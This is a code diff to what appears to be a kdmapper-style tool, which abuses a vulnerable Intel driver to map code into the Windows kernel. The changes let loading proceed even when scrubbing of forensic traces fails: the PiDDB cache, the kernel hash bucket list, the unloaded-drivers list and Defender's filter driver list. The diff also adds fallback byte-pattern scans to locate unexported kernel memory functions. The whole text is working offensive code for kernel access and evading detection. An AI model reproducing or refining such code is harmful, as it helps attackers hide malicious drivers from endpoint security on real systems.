@@ -187,27 +187,19 @@ NTSTATUS intel_driver::Load() {
 	}
 
 	if (!intel_driver::ClearPiDDBCacheTable()) {
-		kdmLog(L"[-] Failed to ClearPiDDBCacheTable" << std::endl);
-		intel_driver::Unload();
-		return STATUS_DELETE_PENDING | 0x1000; //add custom value to error code to identify specific fail
+		kdmLog(L"[!] Failed to ClearPiDDBCacheTable; continuing after functional load" << std::endl);
 	}
 
 	if (!intel_driver::ClearKernelHashBucketList()) {
-		kdmLog(L"[-] Failed to ClearKernelHashBucketList" << std::endl);
-		intel_driver::Unload();
-		return STATUS_DELETE_PENDING | 0x2000;
+		kdmLog(L"[!] Failed to ClearKernelHashBucketList; continuing after functional load" << std::endl);
 	}
 
 	if (!intel_driver::ClearMmUnloadedDrivers()) {
-		kdmLog(L"[!] Failed to ClearMmUnloadedDrivers" << std::endl);
-		intel_driver::Unload();
-		return STATUS_DELETE_PENDING | 0x3000;
+		kdmLog(L"[!] Failed to ClearMmUnloadedDrivers; continuing after functional load" << std::endl);
 	}
 
 	if (!intel_driver::ClearWdFilterDriverList()) {
-		kdmLog("[!] Failed to ClearWdFilterDriverList" << std::endl);
-		intel_driver::Unload();
-		return STATUS_DELETE_PENDING | 0x4000;
+		kdmLog("[!] Failed to ClearWdFilterDriverList; continuing after functional load" << std::endl);
 	}
 
 	return STATUS_SUCCESS;
@@ -369,10 +361,11 @@ NTSTATUS intel_driver::Unload() {
 	if (hDevice && hDevice != INVALID_HANDLE_VALUE) {
 		CloseHandle(hDevice);
 	}
+	hDevice = 0;
 
-	auto status = service::StopAndRemove(GetDriverNameW());
-	if (!NT_SUCCESS(status))
-		return status;
+	auto const service_status = service::StopAndRemove(GetDriverNameW());
+	if (!NT_SUCCESS(service_status))
+		kdmLog(L"[!] StopAndRemove failed; attempting vulnerable driver file cleanup anyway" << std::endl);
 
 	std::wstring driver_path = GetDriverPath();
 
@@ -401,7 +394,7 @@ NTSTATUS intel_driver::Unload() {
 	if (_wremove(driver_path.c_str()) != 0)
 		return STATUS_DELETE_PENDING;
 
-	return STATUS_SUCCESS;
+	return service_status;
 }
 
 bool intel_driver::MemCopy(uint64_t destination, uint64_t source, uint64_t size) {
@@ -583,6 +576,7 @@ bool intel_driver::MmFreeIndependentPages(uint64_t address, uint32_t size)
 		}
 		kernel_MmFreeIndependentPages += intel_driver::ntoskrnlAddr;
 #else
+		bool resolved_directly = false;
 		kernel_MmFreeIndependentPages = intel_driver::FindPatternInSectionAtKernel("PAGE", intel_driver::ntoskrnlAddr,
 			(BYTE*)"\xBA\x00\x60\x00\x00\x48\x8B\xCB\xE8\x00\x00\x00\x00\x48\x8D\x8B\x00\xF0\xFF\xFF",
 			(char*)"xxxxxxxxx????xxxxxxx");
@@ -596,20 +590,30 @@ bool intel_driver::MmFreeIndependentPages(uint64_t address, uint32_t size)
 				(char*)"xx????xxxx????xxx");
 
 			if (!kernel_MmFreeIndependentPages) {
-				kdmLog(L"[!] Failed to find MmFreeIndependentPages" << std::endl);
-				return false;
+				kdmLog(L"[+] Trying direct function pattern for MmFreeIndependentPages" << std::endl);
+				kernel_MmFreeIndependentPages = intel_driver::FindPatternInSectionAtKernel(".text", intel_driver::ntoskrnlAddr,
+					(BYTE*)"\x48\x89\x5C\x24\x20\x55\x56\x57\x41\x54\x41\x55\x41\x56\x41\x57\x48\x8B\xEC\x48\x83\xEC\x60\x33\xC0\x0F\x57\xC0\x44\x8B\xF8",
+					(char*)"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx");
+				if (!kernel_MmFreeIndependentPages) {
+					kdmLog(L"[!] Failed to find MmFreeIndependentPages" << std::endl);
+					return false;
+				}
+				resolved_directly = true;
 			}
 
-			kernel_MmFreeIndependentPages += 9; // win 11
+			if (!resolved_directly)
+				kernel_MmFreeIndependentPages += 9; // win 11
 		}
 		else {
 			kernel_MmFreeIndependentPages += 8;
 		}
 
-		kernel_MmFreeIndependentPages = (uint64_t)ResolveRelativeAddress((PVOID)kernel_MmFreeIndependentPages, 1, 5);
-		if (!kernel_MmFreeIndependentPages) {
-			kdmLog(L"[!] Failed to find MmFreeIndependentPages" << std::endl);
-			return false;
+		if (!resolved_directly) {
+			kernel_MmFreeIndependentPages = (uint64_t)ResolveRelativeAddress((PVOID)kernel_MmFreeIndependentPages, 1, 5);
+			if (!kernel_MmFreeIndependentPages) {
+				kdmLog(L"[!] Failed to find MmFreeIndependentPages" << std::endl);
+				return false;
+			}
 		}
 #endif
 	}
@@ -648,14 +652,14 @@ BOOLEAN intel_driver::MmSetPageProtection(uint64_t address, uint32_t size, ULONG
 
 			kernel_MmSetPageProtection = intel_driver::FindPatternInSectionAtKernel("PAGELK", intel_driver::ntoskrnlAddr,
 				(BYTE*)"\x0F\x45\x00\x00\x45\x8B\x00\x00\x00\x00\x8D\x00\x00\x00\x00\x00\x00\xFF\xFF\xE8",
-				(char*)"xx??xx????x???xxx");
+				(char*)"xx??xx????x??????xxx");
 
 			if (!kernel_MmSetPageProtection) {
 				kdmLog(L"[!] Failed to find MmSetPageProtection" << std::endl);
 				return FALSE;
 			}
 
-			kernel_MmSetPageProtection += 13;
+			kernel_MmSetPageProtection += 19;
 		}
 		else {
 			kernel_MmSetPageProtection += 10;
